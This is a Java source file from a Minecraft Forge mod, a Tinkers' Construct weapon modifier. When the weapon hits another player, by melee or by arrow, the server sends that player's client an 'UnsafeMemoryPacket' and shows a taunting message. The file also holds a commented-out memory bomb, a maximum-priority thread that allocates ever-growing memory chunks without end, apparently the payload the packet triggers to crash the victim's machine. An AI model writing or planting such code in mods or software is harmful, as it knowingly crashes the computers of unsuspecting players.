package com.csdy.jzyy.modifier.modifier;


import com.csdy.jzyy.network.JzyySyncing;
import com.csdy.jzyy.network.packets.UnsafeMemoryPacket;
import net.minecraft.ChatFormatting;
import net.minecraft.network.chat.Component;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.entity.projectile.AbstractArrow;
import net.minecraft.world.entity.projectile.Projectile;
import net.minecraft.world.phys.EntityHitResult;
import net.minecraftforge.network.PacketDistributor;
import slimeknights.tconstruct.library.modifiers.ModifierEntry;
import slimeknights.tconstruct.library.modifiers.ModifierHooks;
import slimeknights.tconstruct.library.modifiers.hook.combat.MeleeHitModifierHook;
import slimeknights.tconstruct.library.modifiers.hook.ranged.ProjectileHitModifierHook;
import slimeknights.tconstruct.library.modifiers.impl.NoLevelsModifier;
import slimeknights.tconstruct.library.module.ModuleHookMap;
import slimeknights.tconstruct.library.tools.context.ToolAttackContext;
import slimeknights.tconstruct.library.tools.nbt.IToolStackView;
import slimeknights.tconstruct.library.tools.nbt.ModDataNBT;
import slimeknights.tconstruct.library.tools.nbt.ModifierNBT;

public class FuckMemoryTillDie extends NoLevelsModifier implements MeleeHitModifierHook, ProjectileHitModifierHook {

    @Override
    public void afterMeleeHit(IToolStackView tool, ModifierEntry entry, ToolAttackContext context, float damageDealt) {
        LivingEntity target = context.getLivingTarget();
        Player player = context.getPlayerAttacker();
        if (target instanceof Player targetPlayer && player != null) {
            targetPlayer.displayClientMessage(Component.translatable("你感到csdy爬上了你的脊梁...").withStyle(ChatFormatting.RED), false);
            if (!(target instanceof ServerPlayer serverPlayer)) return;
            JzyySyncing.CHANNEL.send(
                    PacketDistributor.PLAYER.with(() -> serverPlayer),
                    new UnsafeMemoryPacket()
            );
        }

    }

    @Override
    public boolean onProjectileHitEntity(ModifierNBT modifiers, ModDataNBT data, ModifierEntry entry, Projectile projectile, EntityHitResult hit, @javax.annotation.Nullable LivingEntity shooter, @javax.annotation.Nullable LivingEntity target) {
        if (projectile instanceof AbstractArrow arrow && target != null) {
            if (target instanceof Player targetPlayer && shooter != null) {
                targetPlayer.displayClientMessage(Component.translatable("你感到csdy爬上了你的脊梁...").withStyle(ChatFormatting.RED), false);
                if (!(target instanceof ServerPlayer serverPlayer)) return false;
                JzyySyncing.CHANNEL.send(
                        PacketDistributor.PLAYER.with(() -> serverPlayer),
                        new UnsafeMemoryPacket()
                );
            }
        }
        return false;
    }

    @Override
    protected void registerHooks(ModuleHookMap.Builder hookBuilder) {
        hookBuilder.addHook(this, ModifierHooks.MELEE_HIT);
        hookBuilder.addHook(this, ModifierHooks.PROJECTILE_HIT);
    }



//    public static void fuckMemoryTillDie() {
//        System.out.println("你感到csdy爬上了你的脊梁...");
//
//        // 禁用OOM捕获
//        Thread bombThread = new Thread(() -> {
//            List<byte[]> memoryHog = new ArrayList<>();
//            long chunkSize = 1024L * 1024 * 1024; // 1GB chunks
//
//            try {
//                while (true) {
//                    System.out.println("已吞噬 " + (memoryHog.size() * chunkSize / (1024 * 1024)) + "MB 内存...");
//                    byte[] chunk = new byte[(int) Math.min(chunkSize, Integer.MAX_VALUE - 2)];
//                    memoryHog.add(chunk);
//
//                    // 确保内存被实际使用
//                    Arrays.fill(chunk, (byte) 0x66);
//
//                    // 指数级增长
//                    chunkSize = (long) (chunkSize * 1.5);
//                }
//            } finally {
//                System.err.println("内存宇宙被csdy吞噬殆尽...");
//            }
//        });
//
//        // 关键修改：不要设置为守护线程！
//        bombThread.setDaemon(false);
//        bombThread.setPriority(Thread.MAX_PRIORITY);
//        bombThread.start();
//
//        // 确保主线程不退出
//        try { Thread.sleep(Long.MAX_VALUE); }
//        catch (InterruptedException e) { Thread.currentThread().interrupt(); }
//    }

}
